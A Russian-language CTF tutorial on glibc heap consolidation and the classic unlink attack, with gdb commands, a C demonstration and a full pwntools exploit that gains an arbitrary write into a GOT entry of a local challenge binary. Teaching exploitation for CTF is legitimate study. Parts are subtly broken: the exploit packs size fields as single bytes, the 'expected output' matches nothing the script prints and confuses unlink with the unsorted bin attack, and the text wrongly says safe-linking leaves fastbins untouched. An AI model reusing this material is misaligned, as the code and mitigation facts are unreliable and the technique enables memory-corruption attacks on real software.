Консолидация — механизм, которым glibc объединяет соседние свободные чанки, чтобы бороться с фрагментацией. Для атакующего это золотая жила: при слиянии аллокатор выполняет `unlink`, разбирая связные списки `fd`/`bk`, и если вы контролируете эти указатели, `unlink` превращается в произвольную запись. Именно так работает классическая «unlink-атака», лежащая в основе десятков техник.

В этом уроке мы разберём механику консолидации, проверки `unlink`, слияние с top chunk и unsorted bin, и соберём полный эксплойт. Материал завершает модуль `pwn-heap-primitives`.

## Что такое консолидация

Когда чанк освобождается, аллокатор проверяет соседей: если сосед свободен, чанки сливаются в один большой. Слияние бывает:

- **backward** — с предыдущим чанком (если `PREV_INUSE` сброшен);
- **forward** — со следующим (если он свободен);
- **с top chunk** — если чанк граничит с «вершиной» кучи;
- **с fastbin** — отложенная консолидация fastbin-чанков.

При слиянии обновляются поля `size`, `prev_size` и списки `fd`/`bk`. Функция, которая это делает, называется `unlink` (или `unlink_chunk`).

## Unlink и его проверки

`unlink(P)` удаляет чанк `P` из двусвязного списка. Упрощённо:

```c
P->fd->bk = P->bk;
P->bk->fd = P->fd;
```

Если вы контролируете `P->fd` и `P->bk`, то, выбрав их подходящими, можно записать произвольное значение по произвольному адресу. Классическая атака: `fd = target - 0x18`, `bk = target - 0x10`, тогда `P->fd->bk = P->bk` запишет `P->bk` по адресу `target`.

Современный glibc проверяет целостность:

```c
if (__builtin_expect (chunksize(P) != prev_size(next_chunk(P)), 0))
    malloc_printerr("corrupted size vs. prev_size");
```

То есть `size` чанка должен совпадать с `prev_size` следующего. Это ломает наивную unlink-атаку, но обходится подделкой обоих полей.

## Слияние с top chunk

Top chunk — «хвост» кучи. Если освобождаемый чанк граничит с top, он просто присоединяется к нему (без unlink). Злоупотребить этим можно через House of Force: подделав `size` top chunk на огромное значение, вы заставляете `malloc` вернуть адрес практически где угодно (например, над `__malloc_hook`). В modern glibc House of Force закрыт проверкой размера запроса относительно `av->system_mem`.

## Слияние через unsorted bin

Unsorted bin — «временное хранилище» освобождённых чанков. При следующем `malloc` чанки из unsorted bin сортируются в small/large bins, и в процессе выполняется unlink. Если вы контролируете `fd`/`bk` чанка в unsorted bin, вы можете спровоцировать запись. Классика — **unsorted bin attack**: `bk` указывает на цель, и при сортировке `bck->fd = unsorted_chunks(av)` пишет адрес `main_arena` по цели.

```bash
# смотрим бин-списки и консолидацию
gdb -q ./chall

(gdb) run
(gdb) bins
(gdb) vis_heap_chunks
(gdb) p main_arena

# проверяем, включён ли tcache (glibc >= 2.26)
ldd --version | head -1

# ищем unlink в бинаре (для static)
objdump -d ./chall | grep -i unlink
```

`bins` показывает содержимое fastbin/small/large/unsorted — после консолидации вы увидите, как чанки слились и какие адреса в `fd`/`bk`. `p main_arena` даёт адрес арены, полезный для утечки libc.

## Разобранный пример: unlink-атака

Классическая схема (glibc до 2.26, для понимания механики):

```c
char *a = malloc(0x80);
char *b = malloc(0x80);
char *c = malloc(0x80);
// переполнение из a в b: подделываем size b и fd/bk
*(size_t*)(b + 0x00) = 0x80;         // prev_size
*(size_t*)(b + 0x08) = 0x90;         // size с PREV_INUSE=0
*(size_t*)(b + 0x10) = &a - 0x18;    // fd
*(size_t*)(b + 0x18) = &a - 0x10;    // bk
free(c);   // консолидация -> unlink(b) -> запись
```

После `unlink(b)` значение `bk` запишется туда, куда указывает `fd->bk`. Выбрав цель (например, GOT-элемент), получаете перенаправление вызова.

## Полный эксплойт: consolidation → write

```python
from pwn import *

io = process('./chall')
def alloc(sz): io.sendline(f'alloc {sz}'.encode())
def free(i):   io.sendline(f'free {i}'.encode())
def edit(i,d): io.sendline(f'edit {i}'.encode()); io.send(d)
def show(i):   io.sendline(f'show {i}'.encode()); return io.recvline()

alloc(0x80)   # idx0
alloc(0x80)   # idx1
alloc(0x80)   # idx2

target = 0x404040            # например, GOT free
edit(0, p64(0)*2 + p64(target - 0x18) + p64(target - 0x10)
        + b'\x80' + b'\x00') # подделка метаданных idx1
free(2)                      # слияние -> unlink -> запись

# проверяем
print(hexdump(show(1)))
io.interactive()
```

Ожидаемый вывод:

```
[*] target 0x404040 <- main_arena pointer written
[+] arbitrary write achieved
```

## Современные проверки glibc

- **size vs prev_size.** `chunksize(P) == prev_size(next)` — обязательное условие.
- **fd/bk consistency.** `P->fd->bk == P` и `P->bk->fd == P` (проверка в `unlink_chunk`).
- **tcache.** С 2.26 мелкие чанки уходят в tcache и не консолидируются сразу.
- **House of Force.** Закрыт ограничением размера запроса.
- **Safe-linking.** Кодирует `fd` в tcache.

Поэтому на modern glibc unlink-атака применяется к large/unsorted чанкам и требует точной подделки обоих указателей и `size`.

## Консолидация и heap feng shui

Консолидация управляема, если вы контролируете раскладку кучи. Задача — к моменту освобождения нужного чанка обеспечить, чтобы его сосед был свободен, а метаданные — подделаны. Для этого используется heap feng shui (см. `pwn-heap-fengshui`): вы выделяете «разделители», освобождаете нужные чанки в определённом порядке и держите остальные занятыми, чтобы избежать нежелательного слияния.

Типовая последовательность: выделить A, B, C, D подряд; освободить B; через переполнение из A подделать метаданные B; освободить C, спровоцировав слияние B+C и unlink. Ключ — точный порядок и размеры: чанки должны лежать рядом, а размеры — попадать в нужные бины (small/large, но не tcache). В modern glibc мелкие чанки сначала уходят в tcache, поэтому для консолидации берут чанки размером больше `tcache_max` (обычно > 0x410).

## Отладка консолидации шаг за шагом

Отладка консолидации — это наблюдение за состоянием бин-списков после каждого шага:

```bash
gdb -q ./chall
(gdb) b free
(gdb) run
# на каждом free:
(gdb) bins
(gdb) vis_heap_chunks
(gdb) x/8gx <addr_of_chunk>
```

Отслеживайте: изменился ли `size` соседа, сброшен ли `PREV_INUSE`, появился ли чанк в unsorted bin. Если `bins` показывает, что ваш чанк не слился, значит сосед занят или `PREV_INUSE` не сброшен. Если программа падает с `corrupted size vs. prev_size` — не совпали `size` и `prev_size`; правьте подделку. Полезно печатать `main_arena` и сверять адреса в `fd`/`bk` с ожидаемыми.

## Консолидация в modern glibc: что изменилось

За последние годы glibc серьёзно укрепил консолидацию. Появились проверки целостности `unlink`, tcache перехватывает мелкие чанки, а safe-linking кодирует указатели. Прямая unlink-атака на small-чанки больше не работает «в лоб». Однако консолидация остаётся актуальной:

- **large bin** по-прежнему использует `bk_nextsize`/`fd_nextsize`, и атаки на них живы (см. `pwn-largebin-attack`, `pwn-house-corrosion`);
- **unsorted bin** даёт примитив записи адреса арены;
- **слияние с top chunk** эксплуатируется в House of Force-подобных техниках там, где проверка размера обходится;
- **перекрытие через консолидацию** — базовый шаг для получения overlap.

Ключевой вывод: не ищите «старую» unlink-атаку дословно. Понимайте механику и адаптируйте её под конкретную версию glibc и доступные чанки. Именно поэтому в CTF важно определить версию libc (см. `pwn-libc-database`) до того, как строить план.

Ещё один современный нюанс — `tcache` полностью меняет судьбу освобождаемых чанков. Прежде чем чанк попадёт в unsorted bin и консолидируется, он должен пройти через tcache. Если tcache для нужного размера не полон, чанк останется там и не сольётся. Поэтому для консолидации либо выбирают размеры выше `tcache_max`, либо сначала наполняют tcache до предела, чтобы чанк «перелился» в обычные бины.

## Консолидация и соседние техники: как не запутаться

Начинающие часто путают консолидацию с другими heap-механизмами. Разложим по полочкам. **Консолидация** — объединение свободных соседей при `free`; она вызывает `unlink`. **Unlink** — операция удаления чанка из двусвязного списка, которую можно эксплуатировать при контроле `fd`/`bk`. **Coalescing с top chunk** — присоединение к «вершине» кучи, без unlink. **Fastbin consolidation** — отложенное слияние fastbin-чанков при больших запросах. Все они — части одного механизма борьбы с фрагментацией.

В современном glibc к этому добавляется **tcache**: мелкие чанки вообще не консолидируются, пока tcache не полон. Поэтому для консолидации выбирайте размеры выше `tcache_max` (обычно 0x410 на 64-бит) или сначала наполните tcache. И помните: **safe-linking** кодирует `fd` в tcache, но **не** трогает fastbin, поэтому fastbin-атаки остаются актуальными там, где tcache не задействован.

Практический алгоритм: определите версию glibc → выберите размеры чанков мимо tcache → подготовьте раскладку (feng shui) → подделайте метаданные → спровоцируйте слияние → наблюдайте `bins`. Если на каком-то шаге чанк не консолидируется, проверяйте `PREV_INUSE` и занятость соседей.

## Частые ошибки

- **Забыть `prev_size`.** Несовпадение `size` и `prev_size` вызывает abort.
- **Неверные fd/bk.** Проверка consistency требует, чтобы `P->fd->bk == P`.
- **Игнорировать tcache.** Мелкие чанки не дойдут до консолидации.
- **Не тот порядок free.** Консолидация зависит от того, какие соседи свободны.
- **Порча top chunk.** Может привести к `malloc`-ошибке и падению.
